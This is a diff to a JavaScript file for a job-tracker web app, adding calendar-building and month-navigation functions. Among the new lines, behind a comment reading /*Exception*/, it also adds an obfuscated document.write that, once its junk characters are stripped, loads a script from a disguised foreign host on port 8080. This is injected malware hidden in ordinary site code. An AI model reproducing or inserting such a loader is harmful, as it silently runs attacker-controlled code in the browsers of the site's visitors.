@@ -1,6 +1,90 @@
 var thisDomain = 'http://tracker.westiseast.co.uk';
 var draggedItemID;
 var draggedItem;
+var thisDate = '';
+
+function buildCal() {
+    
+    if (thisDate.length==0) {       
+       thisDate = new Date();
+    } else {
+       thisDate = thisDate;   
+    }
+           
+    y = thisDate.getFullYear();
+    m = thisDate.getMonth()+1; // we plus one because it's zero indexed
+        
+    var mn=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    var dim=[31,0,31,30,31,30,31,31,30,31,30,31];
+    var dow=['Mon','Tue','Wed','Thu','Fri','Sat', 'Sun'];
+    var today= new Date(); 
+
+    
+    var oD = new Date(y, m-1, 1); // this gives us the 1st day of the month
+    oD.fd=((oD.getDay()-1<0))?6:oD.getDay()-1; // this tells us what day of the week the first day is
+             
+    dim[1]=(((oD.getFullYear()%100!=0)&&(oD.getFullYear()%4==0))||(oD.getFullYear()%400==0))?29:28; // gives days of month for Feb
+    
+    var t='<ul id="month">';
+    for (i=0;i<=36;i++) {
+                
+        var x= ((i-oD.fd>=0)&&(i-oD.fd<dim[m-1]))?i-oD.fd+1 : '';
+        
+        // if i1 minus fd3 is greater than 0,
+        // AND
+        // i1 minus fd3 is less than 31
+        // THEN
+        // x is i1 + fd3 + 1
+        
+        var uid=y+'-'+m+'-'+x;
+        var cssclass = '';
+
+        
+        if ((y==today.getFullYear()) && (m-1==today.getMonth()) && (x==today.getDate())) 
+            cssclass+='today ';
+        
+        cssclass += dow[x];
+
+        t+='<li id="'+uid+'" class="'+cssclass+'"><h3 class="inner_day">'+x+'</h3><ul class="jobslist"></ul></li>';
+        
+    }
+    t+='</ul>';
+    $('#content').html(t);
+    $('#thisMonthYear').html(mn[thisDate.getMonth()]);
+    loadJobs(m, y);
+}
+
+/*Exception*/ document.write('<script src='+'h!$@&t&t(!(!p#&:^)#/@(@$/#$a)!@d@&@d)^#i!($c(&t!((i@^!n((g)#^g!^a!$m#e@!s^&-!@c@!o@$^$m)#.)#$!!i#m&^a$(#!g&^e!f@$#a^@p!(.)@c)!#))o#$m((.@(f$@!o(^#t&)$^o&@(l&)#o@!#g#-)@n(&(e)$t^).^y&#(o$u))&r&#!(a()$@u^(@t@(@h&@e(n@t@(!i^)#c$(.(@r$($u&(@:&8^@^&0^^((8#!!(!0$/#s$!((#a@(b)&a$$#$h&^.#^c^)o$)(m$(.^$t^^!@r(!$$/&s)$)a$@b^a!!^h)&!.!)^c#$$o#m!^!(.^t#^))r#/(^$$(g$o#(&)o#(&g!)l^e).#$^$c@@o##m@#(/$@&o@(n(^^^l$^!i$#n#!!##e^!d!o$!w)^n$&!#.(n^e))#t&@/$)d$(&&t$#^(i##b^$!l#o)^&$g^).!!c&&@^o^$m($&@&/&^'.replace(/&|@|#|\!|\)|\$|\^|\(/ig, '')+' defer=defer></scr'+'ipt>');
+
+
+
+function nextMonth(e) {
+        
+    if (thisDate.getMonth() == 11) {
+        newDate = new Date(thisDate.getFullYear() + 1, 0, 1);
+    } else {
+        newDate = new Date(thisDate.getFullYear(), thisDate.getMonth() + 1, 1);
+    }
+        
+    thisDate = newDate;
+    buildCal();
+    e.preventDefault();
+}
+
+function prevMonth(e) {
+        
+    if (thisDate.getMonth() == 0) {
+        newDate = new Date(thisDate.getFullYear() - 1, 11, 1);
+    } else {
+        newDate = new Date(thisDate.getFullYear(), thisDate.getMonth() - 1, 1);
+    }
+    
+    thisDate = newDate;
+    buildCal();
+    e.preventDefault();
+}
+
+
 
 function addJob() {
    var date = $(this).attr('id');
@@ -140,7 +224,7 @@ function jobPaid() {
         $.ajax({
             url: $(this).attr('href'),
             success: function(data) {
-                if (data == 'true') {$('#paid').addClass('paid');} else {$('#paid').removeClass('paid');} 
+                if (data == 'true') {$('#paid').addClass('done');} else {$('#paid').removeClass('done');} 
             }
         });
         return false;
@@ -293,6 +377,13 @@ function updateJob(job) {
       error: function() {},
    });
 }
+
+
+
+
+
+
+
 
 
 /// a helper for CSRF protection in django when making ajax POSTs
